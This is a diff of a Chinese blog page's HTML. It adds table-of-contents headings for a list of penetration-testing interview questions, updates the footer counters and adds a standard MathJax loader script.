+webshell 发现网站根目录下有.htaccess 文件，我们能做什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%8B%97%E4%BC%9A%E8%BF%BD%E8%B8%AA%E5%8F%98%E9%87%8F%E4%BB%8E%E8%80%8C%E5%8F%91%E7%8E%B0%E5%87%BA%E6%98%AF%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%90%97"><span class="nav-number">54.</span> <span class="nav-text">安全狗会追踪变量，从而发现出是一句话木马吗？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%97%B6%E9%80%89%E6%8B%A9%E5%8F%AF%E8%AF%BB%E5%86%99%E7%9B%AE%E5%BD%95%E4%B8%BA%E4%BD%95%E5%B0%BD%E9%87%8F%E4%B8%8D%E7%94%A8%E5%B8%A6%E7%A9%BA%E6%A0%BC%E7%9A%84%E7%9B%AE%E5%BD%95"><span class="nav-number">55.</span> <span class="nav-text">提权时选择可读写目录，为何尽量不用带空格的目录？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E8%BF%99%E4%B8%AA%E9%98%B2%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E6%8B%BF-shell"><span class="nav-number">56.</span> <span class="nav-text">如何利用这个防注入系统拿
+shell？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#csrfssrf-%E5%92%8C%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB"><span class="nav-number">57.</span> <span class="nav-text">CSRF、SSRF
+和重放攻击有什么区别？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="nav-number">58.</span> <span class="nav-text">nmap扫描的几种方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%BD%E6%95%B0%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="nav-number">59.</span> <span class="nav-text">报错注入的函数有哪些？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E6%9D%A5%E5%88%A4%E6%96%AD"><span class="nav-number">60.</span> <span class="nav-text">延时注入如何来判断？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-%E6%B3%A8%E5%85%A5%E5%86%99%E6%96%87%E4%BB%B6%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E5%87%BD%E6%95%B0"><span class="nav-number">61.</span> <span class="nav-text">sql 注入写文件都有哪些函数？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E4%B8%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">62.</span> <span class="nav-text">php中命令执行涉及到的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0"><span class="nav-number">63.</span> <span class="nav-text">宽字节注入产生原理以及根本原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2-csrf"><span class="nav-number">64.</span> <span class="nav-text">如何防止 CSRF?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="nav-number">65.</span> <span class="nav-text">代码执行，文件读取，命令执行的函数都有哪些？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#img-%E6%A0%87%E7%AD%BE%E9%99%A4%E4%BA%86-onerror-%E5%B1%9E%E6%80%A7%E5%A4%96%E8%BF%98%E6%9C%89%E5%85%B6%E4%BB%96%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B7%AF%E5%BE%84%E7%9A%84%E5%8A%9E%E6%B3%95%E5%90%97"><span class="nav-number">66.</span> <span class="nav-text">img
+标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#img-%E6%A0%87%E7%AD%BE%E9%99%A4%E4%BA%86-onerror-%E5%B1%9E%E6%80%A7%E5%A4%96%E5%B9%B6%E4%B8%94-src-%E5%B1%9E%E6%80%A7%E7%9A%84%E5%90%8E%E7%BC%80%E5%90%8D%E5%BF%85%E9%A1%BB%E4%BB%A5.jpg-%E7%BB%93%E5%B0%BE%E6%80%8E%E4%B9%88%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B7%AF%E5%BE%84"><span class="nav-number">67.</span> <span class="nav-text">img
+标签除了 onerror 属性外，并且 src 属性的后缀名，必须以.jpg
+结尾，怎么获取管理员路径。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-aspx-%E6%9C%A8%E9%A9%AC%E6%9D%83%E9%99%90%E6%AF%94-asp-%E5%A4%A7"><span class="nav-number">68.</span> <span class="nav-text">为什么 aspx 木马权限比 asp
+大？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-waf"><span class="nav-number">69.</span> <span class="nav-text">如何绕过 waf？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%89%E5%93%AA%E4%BA%9B%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F"><span class="nav-number">70.</span> <span class="nav-text">文件上传有哪些防护方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%9C%89%E9%98%B2%E6%8A%A4%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="nav-number">71.</span> <span class="nav-text">注入有防护怎么办</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ddos-%E5%A6%82%E4%BD%95%E9%98%B2%E6%8A%A4"><span class="nav-number">72.</span> <span class="nav-text">ddos 如何防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%E5%8F%AF%E4%BB%A5%E9%98%B2%E6%AD%A2-sql-%E6%B3%A8%E5%85%A5"><span class="nav-number">73.</span> <span class="nav-text">为什么参数化查询可以防止 sql
+注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-%E5%A6%82%E4%BD%95%E5%86%99-shell%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="nav-number">74.</span> <span class="nav-text">sql 如何写
+shell&#x2F;单引号被过滤怎么办</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E4%BA%8E-xss-%E6%80%8E%E4%B9%88%E4%BF%AE%E8%A1%A5%E5%BB%BA%E8%AE%AE"><span class="nav-number">75.</span> <span class="nav-text">对于 XSS 怎么修补建议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0-token%E5%92%8C-referer-%E5%81%9A%E6%A8%AA%E5%90%91%E5%AF%B9%E6%AF%94%E8%B0%81%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E9%AB%98"><span class="nav-number">76.</span> <span class="nav-text">添加 token和
+referer 做横向对比，谁安全等级高？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">77.</span> <span class="nav-text">常见的上传绕过方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">78.</span> <span class="nav-text">导致文件包含的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%A5%E4%BE%B5-linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%9C%80%E8%A6%81%E6%B8%85%E9%99%A4%E5%93%AA%E4%BA%9B%E6%97%A5%E5%BF%97"><span class="nav-number">79.</span> <span class="nav-text">入侵 Linux
+服务器后需要清除哪些日志？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%8A%A0%E5%9B%BA%E4%B8%80%E4%B8%AA%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84-windows-%E6%A1%8C%E9%9D%A2%E5%B7%A5%E4%BD%9C%E7%8E%AF%E5%A2%83%E8%AF%B7%E7%BB%99%E5%87%BA%E4%BD%A0%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="nav-number">80.</span> <span class="nav-text">如何加固一个域环境下的
+Windows 桌面工作环境？请给出你的思路。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9D%E5%A1%94%E7%A6%81%E6%AD%A2php%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="nav-number">81.</span> <span class="nav-text">宝塔禁止PHP函数如何绕过？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8"><span class="nav-number">82.</span> <span class="nav-text">fastjson不出网如何利用？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E7%9A%84%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E9%9D%9E%E5%9F%9F%E7%94%A8%E6%88%B7%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="nav-number">83.</span> <span class="nav-text">域内的一个普通用户（非域用户）如何进行利用？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#go%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80shellcode%E5%A6%82%E4%BD%95%E5%85%8D%E6%9D%80%E5%85%8D%E6%9D%80%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">84.</span> <span class="nav-text">go语言免杀shellcode如何免杀？免杀原理是什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-defender%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%E5%8E%9F%E7%90%86%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="nav-number">85.</span> <span class="nav-text">windows
+defender防御机制原理，如何绕过？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E8%BF%9B%E7%A8%8B%E4%BF%9D%E6%8A%A4%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E8%BF%9B%E8%A1%8C%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB"><span class="nav-number">86.</span> <span class="nav-text">卡巴斯基进程保护如何绕过进行进程迁移？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="nav-number">87.</span> <span class="nav-text">工作组环境下如何进行渗透？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%9C%BA%E5%88%B6"><span class="nav-number">88.</span> <span class="nav-text">内存马的机制？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B4%E5%87%BA%E5%8D%B0%E8%B1%A1%E6%AF%94%E8%BE%83%E6%B7%B1%E5%88%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91"><span class="nav-number">89.</span> <span class="nav-text">说出印象比较深刻的一次外网打点进入内网？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%81%E4%B9%A6%E9%80%8F%E6%98%8E%E5%BA%A6%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-number">90.</span> <span class="nav-text">证书透明度的危害？</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -519,7 +815,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -567,7 +863,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -581,7 +877,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -592,7 +888,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -732,6 +1028,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
